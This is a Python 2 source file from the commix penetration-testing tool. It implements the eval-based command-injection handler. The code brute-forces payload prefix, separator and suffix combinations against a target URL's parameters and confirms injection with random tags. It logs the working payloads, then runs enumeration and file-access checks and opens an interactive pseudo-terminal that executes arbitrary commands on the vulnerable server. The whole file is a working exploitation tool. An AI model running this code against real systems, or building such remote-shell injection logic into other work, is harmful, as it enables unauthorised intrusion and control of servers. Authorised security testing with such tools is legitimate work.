#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.eval_based import eb_injector
from src.core.injections.results_based.techniques.eval_based import eb_payloads
from src.core.injections.results_based.techniques.eval_based import eb_enumeration
from src.core.injections.results_based.techniques.eval_based import eb_file_access

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

#-------------------------------------------------
# The "eval-based" injection technique handler.
#-------------------------------------------------
def eb_injection_handler(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  export_injection_info = False
  injection_type = "Results-based Command Injection"
  technique = "eval-based injection technique"
    
  sys.stdout.write("(*) Testing the "+ technique + "... ")
  sys.stdout.flush()
    
  i = 0
  # Calculate all possible combinations
  total = len(settings.EVAL_PREFIXES) * len(settings.EVAL_SEPARATORS) * len(settings.EVAL_SUFFIXES)
  
  for prefix in settings.EVAL_PREFIXES:
    for suffix in settings.EVAL_SUFFIXES:
      for separator in settings.EVAL_SEPARATORS:
        i = i + 1
        
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""
                
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
        B64_ENC_TAG = base64.b64encode(TAG)
        B64_DEC_TRICK = settings.B64_DEC_TRICK

        # Check if defined "--base64" option.
        if menu.options.base64_trick == False:
          B64_ENC_TAG = TAG
          B64_DEC_TRICK = ""
          
        try:
          # Eval-based decision payload (check if host is vulnerable).
          payload = eb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)

          # Check if defined "--prefix" option.
          if menu.options.prefix:
            prefix = menu.options.prefix
            payload = prefix + payload
          else:
            payload = prefix + payload
            
          # Check if defined "--suffix" option.
          if menu.options.suffix:
            suffix = menu.options.suffix
            payload = payload + suffix
          else:
            payload = payload + suffix
      
          payload = payload + "" + B64_DEC_TRICK + ""
          payload = re.sub(" ", "%20", payload)

          # Check if defined "--verbose" option.
          if menu.options.verbose:
            sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)

          # Check if target host is vulnerable.
          response,vuln_parameter = eb_injector.injection_test(payload,http_request_method,url)          
  
          # if need page reload
          if menu.options.url_reload: 
            time.sleep(delay)
            response = urllib.urlopen(url)
            
          # Evaluate test results.
          shell = eb_injector.injection_test_results(response,TAG)
          if not menu.options.verbose:
            percent = ((i*100)/total)
            if percent == 100:
              if no_result == True:
                percent = Fore.RED + "FAILED" + Style.RESET_ALL
              else:
                percent = str(percent)+"%"
            elif len(shell) != 0:
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
            else:
              percent = str(percent)+"%"
            sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
            sys.stdout.flush()
            
        except KeyboardInterrupt: 
          raise
          
        except:
          continue
        
        # Yaw, got shellz! 
        # Do some magic tricks!
        if shell:
          found = True
          no_result = False

          # Print the findings to log file.
          if export_injection_info == False:
            output_file = open(filename + ".txt", "a")
            output_file.write("\n(+) Type : " + injection_type)
            output_file.write("\n(+) Technique : " + technique.title())
            output_file.close()
            export_injection_info = True

          if http_request_method == "GET":
            # Print the findings to log file
            if vp_flag == True:
              output_file = open(filename + ".txt", "a")
              output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
              output_file.write("\n")
              vp_flag = False
              output_file.close()
              
            counter = counter + 1
            output_file = open(filename + ".txt", "a")
            output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
            output_file.close()
            
            #Vulnerable Parameter
            GET_vuln_param = parameters.vuln_GET_param(url)
              
            # Print the findings to terminal.
            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL 
            
          else :
            # Print the findings to log file
            if vp_flag == True:
              output_file = open(filename + ".txt", "a")
              output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
              vp_flag = False
              output_file.close()
              
            counter = counter + 1
            output_file = open(filename + ".txt", "a")
            output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
            output_file.close()
            
            #Vulnerable Parameter
            POST_vuln_param = vuln_parameter
            
            # Print the findings to terminal.
            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
            
          # Check for any enumeration options.
          eb_enumeration.do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)

          # Check for any system file access options.
          eb_file_access.do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
          
          # Pseudo-Terminal shell
          while True:
            gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
            if gotshell in settings.CHOISE_YES:
              print ""
              print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
              while True:
                try:
                  cmd = raw_input("Shell > ")
                  cmd = re.sub(" ","%20", cmd)
                  if cmd == "q":
                    sys.exit(0)
                  else:
                    # The main command injection exploitation.
                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url,vuln_parameter)
                          
                    # if need page reload
                    if menu.options.url_reload:
                      time.sleep(delay)
                      response = urllib.urlopen(url)
                      
                    # Command execution results.
                    shell = eb_injector.injection_results(response,TAG)
                    if shell:
                      shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
                      print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                    
                except KeyboardInterrupt: 
                  print ""
                  sys.exit(0)
              
            elif gotshell in settings.CHOISE_NO:
              if menu.options.verbose:
                sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                sys.stdout.flush()
              break
            
            else:
              if gotshell == "":
                gotshell = "enter"
              print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
              pass
            
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()
    return True

def exploitation(url,delay,filename,http_request_method):
    if eb_injection_handler(url,delay,filename,http_request_method) == False:
      return False

#eof